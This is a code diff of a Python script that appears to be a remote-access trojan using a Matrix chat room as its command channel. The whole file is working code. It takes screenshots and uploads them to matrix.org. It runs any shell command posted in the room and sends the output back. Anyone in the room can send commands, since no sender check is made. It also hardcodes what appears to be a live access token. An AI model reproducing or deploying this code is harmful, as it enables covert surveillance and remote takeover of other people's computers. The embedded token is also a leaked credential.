@@ -1,45 +1,73 @@
-import os
+import requests
 import subprocess
-import simplematrixbotlib as botlib
+import time
+import os
 from mss import mss
 
-creds = botlib.Creds(
-    homeserver="https://matrix.org",
-    username="@jesuslovesnipples:matrix.org",
-    access_token=os.environ.get("MATRIX_TOKEN", "your_token_here")
-)
-
-bot = botlib.Bot(creds)
+ACCESS_TOKEN = "mct_6SNByYmWTBWRrspvYrVrJ9tEGfyFNq_c0MBd1"
+ROOM_ID = "!oCVUgXhQCRpkGgwmSF:matrix.org"
 IMG_PATH = r"C:\Users\Public\screenshot.png"
+HEADERS = {"Authorization": f"Bearer {ACCESS_TOKEN}"}
+BASE = "https://matrix.org/_matrix/client/v3"
 
-@bot.listener.on_message_event
-async def handle_commands(room, message):
-    match = botlib.MessageMatch(room, message, bot)
-    if not match.is_not_from_this_bot():
-        return
+def send_text(text):
+    requests.post(f"{BASE}/rooms/{ROOM_ID}/send/m.room.message", headers=HEADERS, json={
+        "msgtype": "m.text", "body": text
+    })
 
-    if match.command("send"):
-        with mss() as sct:
-            sct.shot(mon=1, output=IMG_PATH)
-        if os.path.exists(IMG_PATH):
-            await bot.api.send_image_message(room.room_id, IMG_PATH)
-        else:
-            await bot.api.send_text_message(room.room_id, "Screenshot failed.")
+def upload_and_send_image(path):
+    with open(path, "rb") as f:
+        r = requests.post("https://matrix.org/_matrix/media/v3/upload", headers={
+            **HEADERS, "Content-Type": "image/png"
+        }, data=f)
+    uri = r.json().get("content_uri")
+    if uri:
+        requests.post(f"{BASE}/rooms/{ROOM_ID}/send/m.room.message", headers=HEADERS, json={
+            "msgtype": "m.image", "body": "screenshot.png", "url": uri
+        })
 
-    elif match.command("cmd"):
-        cmd = " ".join(match.args())
-        if not cmd:
-            await bot.api.send_text_message(room.room_id, "Usage: !cmd <command>")
-            return
-        try:
-            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, timeout=15)
-            await bot.api.send_text_message(room.room_id, f"```\n{output[:3000]}\n```")
-        except subprocess.TimeoutExpired:
-            await bot.api.send_text_message(room.room_id, "Command timed out.")
-        except subprocess.CalledProcessError as e:
-            await bot.api.send_text_message(room.room_id, f"```\n{e.output[:3000]}\n```")
-        except Exception as e:
-            await bot.api.send_text_message(room.room_id, f"Error: {e}")
+def take_screenshot():
+    with mss() as sct:
+        sct.shot(mon=1, output=IMG_PATH)
 
-if __name__ == "__main__":
-    bot.run()
+next_batch = None
+
+# Get initial sync token without processing old messages
+r = requests.get(f"{BASE}/sync", headers=HEADERS, params={"timeout": 0})
+next_batch = r.json().get("next_batch")
+print("Listening for commands...")
+
+while True:
+    r = requests.get(f"{BASE}/sync", headers=HEADERS, params={
+        "since": next_batch,
+        "timeout": 10000
+    })
+    data = r.json()
+    next_batch = data.get("next_batch")
+
+    rooms = data.get("rooms", {}).get("join", {})
+    room = rooms.get(ROOM_ID, {})
+    events = room.get("timeline", {}).get("events", [])
+
+    for event in events:
+        if event.get("type") != "m.room.message":
+            continue
+        body = event.get("content", {}).get("body", "").strip()
+        sender = event.get("sender", "")
+        print(f"{sender}: {body}")
+
+        if body == "!send":
+            take_screenshot()
+            upload_and_send_image(IMG_PATH)
+
+        elif body.startswith("!cmd "):
+            cmd = body[5:]
+            try:
+                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, timeout=15)
+                send_text(f"```\n{output[:3000]}\n```")
+            except subprocess.TimeoutExpired:
+                send_text("Command timed out.")
+            except subprocess.CalledProcessError as e:
+                send_text(f"```\n{e.output[:3000]}\n```")
+            except Exception as e:
+                send_text(f"Error: {e}")
